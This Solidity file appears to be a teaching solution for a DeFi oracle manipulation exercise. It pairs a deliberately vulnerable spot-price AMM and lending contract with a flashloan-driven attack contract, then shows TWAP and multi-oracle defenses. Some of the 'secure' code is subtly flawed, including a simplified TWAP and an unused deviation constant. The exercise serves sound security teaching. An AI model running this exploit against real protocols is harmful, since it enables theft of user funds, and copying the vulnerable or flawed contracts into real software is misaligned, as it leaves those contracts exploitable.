// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title Project 34 Solution: Oracle Manipulation Attack
 * @notice Complete implementation of oracle manipulation attack and defenses
 */

// Simple ERC20 token for testing
contract Token {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory _name, string memory _symbol, uint256 _initialSupply) {
        name = _name;
        symbol = _symbol;
        totalSupply = _initialSupply;
        balanceOf[msg.sender] = _initialSupply;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }
}

/**
 * @title SimpleAMM
 * @notice A basic AMM for token swaps with vulnerable spot price oracle
 */
contract SimpleAMM {
    Token public token0;
    Token public token1;

    uint256 public reserve0;
    uint256 public reserve1;

    event Swap(
        address indexed user,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out
    );

    event LiquidityAdded(address indexed provider, uint256 amount0, uint256 amount1);

    constructor(address _token0, address _token1) {
        token0 = Token(_token0);
        token1 = Token(_token1);
    }

    function addLiquidity(uint256 amount0, uint256 amount1) external {
        token0.transferFrom(msg.sender, address(this), amount0);
        token1.transferFrom(msg.sender, address(this), amount1);

        reserve0 += amount0;
        reserve1 += amount1;

        emit LiquidityAdded(msg.sender, amount0, amount1);
    }

    function swap(address tokenIn, uint256 amountIn) external returns (uint256 amountOut) {
        require(
            tokenIn == address(token0) || tokenIn == address(token1),
            "Invalid token"
        );

        bool isToken0 = tokenIn == address(token0);

        (Token tokenInContract, Token tokenOutContract, uint256 reserveIn, uint256 reserveOut) =
        isToken0
            ? (token0, token1, reserve0, reserve1)
            : (token1, token0, reserve1, reserve0);

        tokenInContract.transferFrom(msg.sender, address(this), amountIn);

        uint256 amountInWithFee = amountIn * 997;
        amountOut = (reserveOut * amountInWithFee) / (reserveIn * 1000 + amountInWithFee);

        tokenOutContract.transfer(msg.sender, amountOut);

        if (isToken0) {
            reserve0 += amountIn;
            reserve1 -= amountOut;
            emit Swap(msg.sender, amountIn, 0, 0, amountOut);
        } else {
            reserve1 += amountIn;
            reserve0 -= amountOut;
            emit Swap(msg.sender, 0, amountIn, amountOut, 0);
        }
    }

    /**
     * @notice VULNERABLE: Spot price oracle
     * @dev Can be manipulated within a single transaction
     */
    function getPrice() external view returns (uint256 price) {
        require(reserve0 > 0 && reserve1 > 0, "No liquidity");
        price = (reserve1 * 1e18) / reserve0;
    }
}

/**
 * @title VulnerableLending
 * @notice Lending protocol using manipulable spot price oracle
 */
contract VulnerableLending {
    SimpleAMM public oracle;
    Token public collateralToken;
    Token public borrowToken;

    uint256 public constant COLLATERAL_RATIO = 150;

    mapping(address => uint256) public deposits;
    mapping(address => uint256) public borrowed;

    event Deposit(address indexed user, uint256 amount);
    event Borrow(address indexed user, uint256 amount);
    event Repay(address indexed user, uint256 amount);
    event Withdraw(address indexed user, uint256 amount);

    constructor(address _oracle, address _collateralToken, address _borrowToken) {
        oracle = SimpleAMM(_oracle);
        collateralToken = Token(_collateralToken);
        borrowToken = Token(_borrowToken);
    }

    function deposit(uint256 amount) external {
        collateralToken.transferFrom(msg.sender, address(this), amount);
        deposits[msg.sender] += amount;
        emit Deposit(msg.sender, amount);
    }

    function borrow(uint256 amount) external {
        uint256 collateralAmount = deposits[msg.sender];
        require(collateralAmount > 0, "No collateral");

        // VULNERABILITY: Using spot price that can be manipulated
        uint256 price = oracle.getPrice();

        uint256 collateralValue = (collateralAmount * price) / 1e18;
        uint256 maxBorrow = (collateralValue * 100) / COLLATERAL_RATIO;

        uint256 totalBorrowed = borrowed[msg.sender] + amount;
        require(totalBorrowed <= maxBorrow, "Insufficient collateral");

        borrowed[msg.sender] += amount;
        borrowToken.transfer(msg.sender, amount);

        emit Borrow(msg.sender, amount);
    }

    function repay(uint256 amount) external {
        borrowed[msg.sender] -= amount;
        borrowToken.transferFrom(msg.sender, address(this), amount);
        emit Repay(msg.sender, amount);
    }

    function withdraw(uint256 amount) external {
        require(borrowed[msg.sender] == 0, "Outstanding debt");
        deposits[msg.sender] -= amount;
        collateralToken.transfer(msg.sender, amount);
        emit Withdraw(msg.sender, amount);
    }

    function getHealthFactor(address user) external view returns (uint256 health) {
        uint256 collateralAmount = deposits[user];
        uint256 borrowedAmount = borrowed[user];

        if (borrowedAmount == 0) return type(uint256).max;

        uint256 price = oracle.getPrice();
        uint256 collateralValue = (collateralAmount * price) / 1e18;

        health = (collateralValue * 100) / borrowedAmount;
    }
}

/**
 * @title FlashloanProvider
 * @notice Provides flashloans for the attack
 */
interface IFlashloanReceiver {
    function onFlashloan(address token, uint256 amount, bytes calldata data) external;
}

contract FlashloanProvider {
    Token public token;

    event Flashloan(address indexed receiver, uint256 amount);

    constructor(address _token) {
        token = Token(_token);
    }

    function flashloan(uint256 amount, bytes calldata data) external {
        uint256 balanceBefore = token.balanceOf(address(this));

        token.transfer(msg.sender, amount);

        IFlashloanReceiver(msg.sender).onFlashloan(address(token), amount, data);

        uint256 balanceAfter = token.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flashloan not repaid");

        emit Flashloan(msg.sender, amount);
    }

    function deposit(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
    }
}

/**
 * @title AttackerSolution
 * @notice Complete implementation of the oracle manipulation attack
 *
 * ATTACK FLOW:
 * 1. Flashloan large amount of token1
 * 2. Swap token1 → token0 to inflate token0 price
 * 3. Deposit token0 as collateral (now overvalued)
 * 4. Borrow maximum token1 using inflated collateral value
 * 5. Swap token0 → token1 to restore price
 * 6. Repay flashloan
 * 7. Keep profit (borrowed tokens - flashloan)
 */
contract AttackerSolution is IFlashloanReceiver {
    SimpleAMM public amm;
    VulnerableLending public lending;
    Token public token0; // collateral token
    Token public token1; // borrow token
    FlashloanProvider public flashloanProvider;

    uint256 public profit;

    event AttackExecuted(uint256 profit);
    event PriceManipulation(uint256 priceBefore, uint256 priceAfter, uint256 priceRestored);

    constructor(
        address _amm,
        address _lending,
        address _token0,
        address _token1,
        address _flashloanProvider
    ) {
        amm = SimpleAMM(_amm);
        lending = VulnerableLending(_lending);
        token0 = Token(_token0);
        token1 = Token(_token1);
        flashloanProvider = FlashloanProvider(_flashloanProvider);
    }

    /**
     * @notice Execute the oracle manipulation attack
     * @param flashloanAmount Amount of token1 to borrow via flashloan
     * @param collateralAmount Amount of token0 to use as collateral
     */
    function attack(uint256 flashloanAmount, uint256 collateralAmount) external {
        // Encode collateral amount to pass to flashloan callback
        bytes memory data = abi.encode(collateralAmount);

        // Initiate flashloan - attack continues in onFlashloan callback
        flashloanProvider.flashloan(flashloanAmount, data);
    }

    /**
     * @notice Flashloan callback - executes the attack
     */
    function onFlashloan(address, uint256 amount, bytes calldata data) external {
        require(msg.sender == address(flashloanProvider), "Only flashloan provider");

        // Decode collateral amount
        uint256 collateralAmount = abi.decode(data, (uint256));

        // Record initial price
        uint256 priceBefore = amm.getPrice();

        // ============================================
        // STEP 1: Manipulate price upward
        // ============================================
        // Swap large amount of token1 → token0
        // This decreases reserve0 and increases reserve1
        // Result: token0 price increases (more token1 per token0)

        token1.approve(address(amm), amount);
        uint256 token0Received = amm.swap(address(token1), amount);

        // Check manipulated price
        uint256 priceAfter = amm.getPrice();

        // ============================================
        // STEP 2: Deposit collateral at inflated price
        // ============================================
        token0.approve(address(lending), collateralAmount);
        lending.deposit(collateralAmount);

        // ============================================
        // STEP 3: Borrow maximum using inflated collateral value
        // ============================================
        // Calculate how much we can borrow
        // collateralValue = collateralAmount * manipulatedPrice
        // maxBorrow = collateralValue * 100 / 150
        uint256 collateralValue = (collateralAmount * priceAfter) / 1e18;
        uint256 maxBorrow = (collateralValue * 100) / 150;

        // Borrow the maximum amount
        lending.borrow(maxBorrow);

        // ============================================
        // STEP 4: Restore price by swapping back
        // ============================================
        // Swap token0 → token1 to restore reserves
        // We need to swap back enough to repay the flashloan

        uint256 token0ToSwap = token0Received - collateralAmount;
        token0.approve(address(amm), token0ToSwap);
        uint256 token1Received = amm.swap(address(token0), token0ToSwap);

        // Check restored price
        uint256 priceRestored = amm.getPrice();

        emit PriceManipulation(priceBefore, priceAfter, priceRestored);

        // ============================================
        // STEP 5: Repay flashloan
        // ============================================
        token1.approve(address(flashloanProvider), amount);

        // ============================================
        // Calculate profit
        // ============================================
        // Profit = borrowed amount + token1 from swap - flashloan amount
        uint256 totalToken1 = token1.balanceOf(address(this));
        profit = totalToken1 >= amount ? totalToken1 - amount : 0;

        emit AttackExecuted(profit);
    }

    /**
     * @notice Get profit from attack
     */
    function getProfit() external view returns (uint256) {
        return token1.balanceOf(address(this));
    }

    /**
     * @notice Withdraw profit
     */
    function withdrawProfit() external {
        uint256 balance = token1.balanceOf(address(this));
        token1.transfer(msg.sender, balance);
    }
}

// ============================================
// SECURE IMPLEMENTATIONS
// ============================================

/**
 * @title TWAPOracle
 * @notice Time-Weighted Average Price oracle (more secure)
 * @dev Implements Uniswap V2 style TWAP
 */
contract TWAPOracle {
    SimpleAMM public pair;

    uint256 public price0CumulativeLast;
    uint256 public price1CumulativeLast;
    uint32 public blockTimestampLast;

    uint256 public price0Average;
    uint256 public price1Average;

    uint256 public constant PERIOD = 1 hours;

    event OracleUpdated(uint256 price0Average, uint256 price1Average);

    constructor(address _pair) {
        pair = SimpleAMM(_pair);
        uint256 reserve0 = pair.reserve0();
        uint256 reserve1 = pair.reserve1();

        require(reserve0 > 0 && reserve1 > 0, "No liquidity");

        price0CumulativeLast = 0;
        price1CumulativeLast = 0;
        blockTimestampLast = uint32(block.timestamp);
    }

    /**
     * @notice Update the TWAP
     * @dev Must be called periodically to maintain accurate TWAP
     */
    function update() external {
        uint32 blockTimestamp = uint32(block.timestamp);
        uint32 timeElapsed = blockTimestamp - blockTimestampLast;

        // Ensure minimum time has passed
        require(timeElapsed >= PERIOD, "Period not elapsed");

        uint256 reserve0 = pair.reserve0();
        uint256 reserve1 = pair.reserve1();

        require(reserve0 > 0 && reserve1 > 0, "No liquidity");

        // Calculate cumulative prices
        uint256 price0Cumulative = price0CumulativeLast + (reserve1 * 1e18 / reserve0) * timeElapsed;
        uint256 price1Cumulative = price1CumulativeLast + (reserve0 * 1e18 / reserve1) * timeElapsed;

        // Calculate average prices
        price0Average = (price0Cumulative - price0CumulativeLast) / timeElapsed;
        price1Average = (price1Cumulative - price1CumulativeLast) / timeElapsed;

        // Update stored values
        price0CumulativeLast = price0Cumulative;
        price1CumulativeLast = price1Cumulative;
        blockTimestampLast = blockTimestamp;

        emit OracleUpdated(price0Average, price1Average);
    }

    /**
     * @notice Get TWAP price
     * @dev Returns time-weighted average, not spot price
     */
    function getPrice() external view returns (uint256) {
        require(price0Average > 0, "Oracle not initialized");
        return price0Average;
    }
}

/**
 * @title SecureLending
 * @notice Lending protocol using TWAP oracle
 * @dev More resistant to price manipulation
 */
contract SecureLending {
    TWAPOracle public oracle;
    Token public collateralToken;
    Token public borrowToken;

    uint256 public constant COLLATERAL_RATIO = 150;
    uint256 public constant MAX_PRICE_DEVIATION = 10; // 10% max deviation

    mapping(address => uint256) public deposits;
    mapping(address => uint256) public borrowed;
    mapping(address => uint256) public lastActionBlock;

    event Deposit(address indexed user, uint256 amount);
    event Borrow(address indexed user, uint256 amount);
    event Repay(address indexed user, uint256 amount);
    event Withdraw(address indexed user, uint256 amount);

    constructor(address _oracle, address _collateralToken, address _borrowToken) {
        oracle = TWAPOracle(_oracle);
        collateralToken = Token(_collateralToken);
        borrowToken = Token(_borrowToken);
    }

    function deposit(uint256 amount) external {
        collateralToken.transferFrom(msg.sender, address(this), amount);
        deposits[msg.sender] += amount;
        lastActionBlock[msg.sender] = block.number;
        emit Deposit(msg.sender, amount);
    }

    /**
     * @notice Borrow with TWAP oracle and additional protections
     */
    function borrow(uint256 amount) external {
        uint256 collateralAmount = deposits[msg.sender];
        require(collateralAmount > 0, "No collateral");

        // PROTECTION 1: Prevent same-block actions
        require(block.number > lastActionBlock[msg.sender], "Wait for next block");

        // PROTECTION 2: Use TWAP instead of spot price
        uint256 price = oracle.getPrice();

        uint256 collateralValue = (collateralAmount * price) / 1e18;
        uint256 maxBorrow = (collateralValue * 100) / COLLATERAL_RATIO;

        uint256 totalBorrowed = borrowed[msg.sender] + amount;
        require(totalBorrowed <= maxBorrow, "Insufficient collateral");

        borrowed[msg.sender] += amount;
        lastActionBlock[msg.sender] = block.number;
        borrowToken.transfer(msg.sender, amount);

        emit Borrow(msg.sender, amount);
    }

    function repay(uint256 amount) external {
        borrowed[msg.sender] -= amount;
        borrowToken.transferFrom(msg.sender, address(this), amount);
        emit Repay(msg.sender, amount);
    }

    function withdraw(uint256 amount) external {
        require(borrowed[msg.sender] == 0, "Outstanding debt");
        deposits[msg.sender] -= amount;
        collateralToken.transfer(msg.sender, amount);
        emit Withdraw(msg.sender, amount);
    }
}

/**
 * @title MultiOracleProtection
 * @notice Example of using multiple oracle sources
 * @dev Combines Chainlink-style oracle with AMM TWAP
 */
contract MultiOracleProtection {
    TWAPOracle public twapOracle;
    SimpleAMM public spotOracle;

    uint256 public constant MAX_DEVIATION = 5; // 5% max deviation between sources

    constructor(address _twapOracle, address _spotOracle) {
        twapOracle = TWAPOracle(_twapOracle);
        spotOracle = SimpleAMM(_spotOracle);
    }

    /**
     * @notice Get price with deviation check
     * @dev Reverts if oracle sources disagree too much
     */
    function getPrice() external view returns (uint256) {
        uint256 twapPrice = twapOracle.getPrice();
        uint256 spotPrice = spotOracle.getPrice();

        // Calculate deviation
        uint256 deviation = twapPrice > spotPrice
            ? ((twapPrice - spotPrice) * 100) / twapPrice
            : ((spotPrice - twapPrice) * 100) / spotPrice;

        // Revert if deviation too large (possible manipulation)
        require(deviation <= MAX_DEVIATION, "Oracle price deviation too large");

        // Return TWAP price (more secure)
        return twapPrice;
    }
}
